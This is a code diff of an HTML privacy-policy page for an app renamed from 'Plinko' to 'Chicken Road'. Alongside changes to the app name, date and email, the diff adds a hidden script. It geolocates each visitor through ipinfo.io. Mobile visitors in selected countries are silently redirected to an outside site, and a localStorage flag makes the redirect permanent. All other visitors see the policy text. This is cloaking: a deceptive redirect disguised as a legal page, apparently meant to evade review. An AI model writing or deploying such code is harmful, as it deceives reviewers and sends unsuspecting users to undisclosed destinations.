@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Privacy Policy - Plinko</title>
+    <title>Privacy Policy - Chicken Road</title>
     <style>
        body {
             margin: 0;
@@ -54,14 +54,67 @@
             background-color: #ff5555;
             color: #ffffff;
         }
+        .hidden {
+        display: none;
+        }
     </style>
+<script>
+  (async function () {
+    // === 1. Вытаскиваем параметры из строки запроса ===
+    function getParam(name) {
+      return new URLSearchParams(window.location.search).get(name);
+    }
+    const adid = getParam("adid");
+    const refer = getParam("refer");
+
+    // === 2. Формируем ссылку с параметрами ===
+    let REDIRECT_URL = "https://lk.nsq.market/en/tools/testing";
+    let urlParams = [];
+    if (adid) urlParams.push(`adid=${encodeURIComponent(adid)}`);
+    if (refer) urlParams.push(`refer=${encodeURIComponent(refer)}`);
+    if (urlParams.length) REDIRECT_URL += "?" + urlParams.join("&");
+
+    const STORAGE_KEY = "wasRedirected_pinco_darts";
+
+    // Если редирект уже был ранее — сразу переброс
+    if (localStorage.getItem(STORAGE_KEY) === "true") {
+      window.location.href = REDIRECT_URL;
+      return;
+    }
+
+    try {
+      const response = await fetch("https://ipinfo.io/json?token=6c0bdcd774927f");
+      if (!response.ok) throw new Error("IP API failed");
+
+      const data = await response.json();
+      const userCountry = data.country;
+      const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+      // Проверка условий и редирект с кэшированием
+      if (isMobile && ["UA", "TT", "TT", "TT", "TT"].includes(userCountry)) {
+        localStorage.setItem(STORAGE_KEY, "true");
+        window.location.href = REDIRECT_URL;
+      } else {
+        document.querySelector(".container").classList.remove("hidden");
+      }
+
+    } catch (error) {
+      console.error("IP check error:", error);
+      // Показываем политику, если ошибка
+      document.querySelector(".container").classList.remove("hidden");
+    }
+  })();
+</script>
+
+
+    
 </head>
 <body>
 
     <div class="container hidden">
-        <h1>Privacy Policy for Plinko</h1>
+        <h1>Privacy Policy for Chicken Road</h1>
         <h2>Privacy Policy</h2>
-        <p>Last updated: July 26, 2025</p>
+        <p>Last updated: September 04, 2025</p>
 
         <p>This Privacy Policy describes Our policies and procedures on the collection, use and disclosure of Your information when You use the Service and tells You about Your privacy rights and how the law protects You.</p>
         
@@ -76,7 +129,7 @@
         <ul>
             <li><strong>Account</strong> means a unique account created for You to access our Service or parts of our Service.</li>
             <li><strong>Affiliate</strong> means an entity that controls, is controlled by or is under common control with a party, where "control" means ownership of 50% or more of the shares, equity interest or other securities entitled to vote for election of directors or other managing authority.</li>
-            <li><strong>Application</strong> refers to Plinko, the software program provided by the Company.</li>
+            <li><strong>Application</strong> refers to Chicken Road, the software program provided by the Company.</li>
             <li><strong>Company</strong> (referred to as either "the Company", "We", "Us" or "Our" in this Agreement) refers to Leaob Page.</li>
             <li><strong>Country</strong> refers to: Russia</li>
             <li><strong>Device</strong> means any device that can access the Service such as a computer, a cellphone or a digital tablet.</li>
@@ -182,7 +235,7 @@
         <h2>Contact Us</h2>
         <p>If you have any questions about this Privacy Policy, You can contact us:</p>
         <ul>
-            <li>By email: rea.app.eg@gmail.com</li>
+            <li>By email: jadnk752@gmail.com</li>
         </ul>
 
         <div class="buttons">
